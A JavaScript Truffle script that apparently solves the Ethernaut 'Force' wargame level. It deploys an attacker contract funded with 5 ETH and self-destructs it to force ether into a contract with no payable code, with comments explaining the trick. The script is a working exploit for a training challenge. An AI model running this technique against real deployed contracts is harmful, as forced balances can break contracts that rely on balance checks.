const ForceContract = artifacts.require('Force')
const ForceAttackContract = artifacts.require('ForceAttack')
const assert = require('assert')

/**
 * Here we have to make the Force contract's balance greater than zero.
 * As Force contract does not have code, we have to find a way to send ether to it without executing Force code.
 * 
 * Some help: http://solidity.readthedocs.io/en/v0.4.21/introduction-to-smart-contracts.html#self-destruct
 * 
 * The solution is to create a new contract with some initial ethers.
 * Then we execute a function of this new contract that self-destructs it, sending its balance to the Force contract.
 */
async function execute(callback) { 
    let contractForce = await ForceContract.deployed()
    // Deploy new contract with initial balance of 5 ETH
    const INITIAL_BALANCE = 5
    let attackerContract = await ForceAttackContract.new(contractForce.address, {
        value: web3.toWei(INITIAL_BALANCE, 'ether')
    })
    
    // Initial balance of Force contract should be 0
    let balance = await web3.eth.getBalance(contractForce.address)
    assert.equal(balance, 0)
    console.log(`Initial balance: ${balance} ETH`)
    
    await attackerContract.destruct()
    
    // Once the transaction is done, final balance of Force contract must have changed
    balance = web3.fromWei(await web3.eth.getBalance(contractForce.address), 'ether')
    assert.equal(balance, INITIAL_BALANCE)
    console.log(`Final balance: ${balance} ETH`)

    callback()
}

module.exports = execute
